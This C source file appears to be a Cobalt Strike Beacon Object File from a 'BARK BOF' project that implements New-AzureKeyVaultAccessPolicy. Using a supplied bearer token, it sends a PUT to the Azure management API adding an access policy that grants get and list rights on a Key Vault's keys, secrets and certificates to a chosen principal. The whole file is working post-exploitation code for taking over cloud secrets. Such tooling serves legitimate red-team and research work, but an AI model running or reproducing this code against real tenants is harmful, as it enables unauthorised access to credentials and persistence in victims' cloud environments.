/*
 * new_azure_key_vault_access_policy.c - BARK BOF
 * New-AzureKeyVaultAccessPolicy - Grant Get+List access policy on a Key Vault
 *
 * Args : token, principalId, tenantId, targetObjectId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   pathBuf[1024], bodyBuf[2048];
    LPWSTR widePath = NULL;
    char  *token = NULL, *principalId = NULL, *tenantId = NULL, *targetObjectId = NULL;

    BeaconDataParse(&parser, args, alen);
    token          = BeaconDataExtract(&parser, NULL);
    principalId    = BeaconDataExtract(&parser, NULL);
    tenantId       = BeaconDataExtract(&parser, NULL);
    targetObjectId = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_new_azure_key_vault_access_policy "
            "<token> <principalId> <tenantId> <keyVaultArmPath>\n");
        return;
    }

    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"properties\":{\"accessPolicies\":[{\"tenantId\":\"%s\",\"objectId\":\"%s\","
        "\"permissions\":{\"keys\":[\"get\",\"list\"],\"secrets\":[\"get\",\"list\"],"
        "\"certificates\":[\"get\",\"list\"]}}]}}",
        tenantId, principalId);

    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "%s/accessPolicies/add?api-version=2021-10-01", targetObjectId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] New-AzureKeyVaultAccessPolicy\n");
    BarkPost(L"management.azure.com", widePath, L"PUT", bodyBuf, token, "application/json");
    HFree(widePath);
}
